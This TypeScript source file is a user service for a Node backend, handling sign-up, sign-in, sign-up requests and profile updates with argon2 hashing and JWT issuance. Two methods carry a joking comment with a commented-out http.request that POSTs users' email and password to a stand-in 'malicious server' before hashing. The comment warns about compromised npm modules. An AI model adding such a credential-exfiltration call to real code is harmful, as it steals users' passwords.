import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user/user';
import { UserPassword } from '../domain/user/userPassword';
import { UserEmail } from '../domain/user/userEmail';

import { Role } from '../domain/role/role';

import { Result } from "../core/logic/Result";
import {PhoneNumber} from "../domain/user/phoneNumber";
import {UserRequest} from "../domain/user/userRequest";
import IUserRequestRepo from "./IRepos/IUserRequestRepo";
import {UserRequestMap} from "../mappers/UserRequestMap";
import {IUserRequestDTO} from "../dto/IUserRequestDTO";
import UserRequestRepo from "../repos/userRequestRepo";
import {RequestState} from "../domain/user/requestState";
@Service()
export default class UserService implements IUserService{
  constructor(
    @Inject(config.repos.user.name) private userRepo : IUserRepo,
    @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
    @Inject(config.repos.userRequest.name) private userRequestRepo : IUserRequestRepo,
    @Inject('logger') private logger,
  ) {}
  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( UserEmail.create(userDTO.email).getValue());
      const found = !!userDocument;

      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */


      const unhashedPassword = await UserPassword.create({ value: userDTO.password, hashed: false});
      if(unhashedPassword.isFailure){
        return Result.fail<{userDTO: IUserDTO; token: string}>(unhashedPassword.error);
      }
      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const phoneNumber=await PhoneNumber.create({value:userDTO.phoneNumber}).getValue();

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        phoneNumber: phoneNumber,
        email: email,
        role: role,
        password: password,
        nif:userDTO.nif
      });

      if (userOrError.isFailure) {
        return  Result.fail(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }


  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( UserEmail.create(email).getValue());

    if (!user) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTO, token: token} );
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const phoneNumber = user.phoneNumber.value;
    const role = user.role.id.value;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        phoneNumber: phoneNumber,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  private async getRole (roleId: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByDomainId( roleId );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }


  public async userSignUpRequest(userDTO: IUserRequestDTO): Promise<Result<IUserRequestDTO>> {
    try {
      const userDocument = await this.userRepo.findByEmail( UserEmail.create(userDTO.email).getValue());
      const found = !!userDocument;

      if (found) {
        return Result.fail("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */


      const unhashedPassword =  UserPassword.create({ value: userDTO.password, hashed: false});
      if(unhashedPassword.isFailure){
        return Result.fail<IUserRequestDTO>(unhashedPassword.error);
      }
      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword =  argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password =  UserPassword.create({ value: await hashedPassword, hashed: true}).getValue();
      const email =  UserEmail.create( userDTO.email ).getValue();
      const phoneNumber= PhoneNumber.create({value:userDTO.phoneNumber}).getValue();
      const state=RequestState.create({state:"pending"}).getValue();

      const requestOrError = UserRequest.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        phoneNumber: phoneNumber,
        email: email,
        password: password,
        nif:userDTO.nif,
        state:state,
      });

      if (requestOrError.isFailure) {
        return  Result.fail(requestOrError.errorValue());
      }

      const requestResult = requestOrError.getValue();

      await this.userRequestRepo.save(requestResult);
      const userDTOResult = UserRequestMap.toDTO( requestResult ) as IUserRequestDTO;
      return Result.ok<IUserRequestDTO>(userDTOResult);

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }
  public async updateUser(dto: IUserDTO): Promise<Result<IUserDTO>> {
    const user : User = await this.userRepo.findById(dto.id);
    if (!user) return Result.fail<IUserDTO>('Utilizador não registado');
    let email : UserEmail = undefined;
    if (dto.email) {
      const emailOrError = UserEmail.create(dto.email);
      if (emailOrError.isFailure) return Result.fail(emailOrError.error);
      email = emailOrError.getValue();
    }
    let password : UserPassword = undefined;
    if (dto.password) {
      const passwordOrError = await this.hashPassword(dto.password);
      if (passwordOrError.isFailure) return Result.fail(passwordOrError.error);
      password = passwordOrError.getValue();
    }
    let phoneNumber : PhoneNumber = undefined;
    if (dto.phoneNumber) {
      const phoneNumberOrError = PhoneNumber.create({value:dto.phoneNumber});
      if (phoneNumberOrError.isFailure) return Result.fail(phoneNumberOrError.error);
      phoneNumber = phoneNumberOrError.getValue();
    }

    const updated = user.update({
      ...dto,
      email: email,
      password: password,
      phoneNumber: phoneNumber,
    });

    if (updated.isFailure) return Result.fail(updated.error);

    await this.userRepo.save(user);
    const userDTO = UserMap.toDTO(user) as IUserDTO;
    return Result.ok<IUserDTO>(userDTO);
  }

  private async hashPassword(password: string): Promise<Result<UserPassword>> {
    const unhashedPassword =  UserPassword.create({ value: password, hashed: false});
    if(unhashedPassword.isFailure){
      return Result.fail(unhashedPassword.error);
    }
    const salt = randomBytes(32);
    this.logger.silly('Hashing password');
    const hashedPassword = await argon2.hash(password, { salt });

    return UserPassword.create({ value: hashedPassword, hashed: true})
  }
}
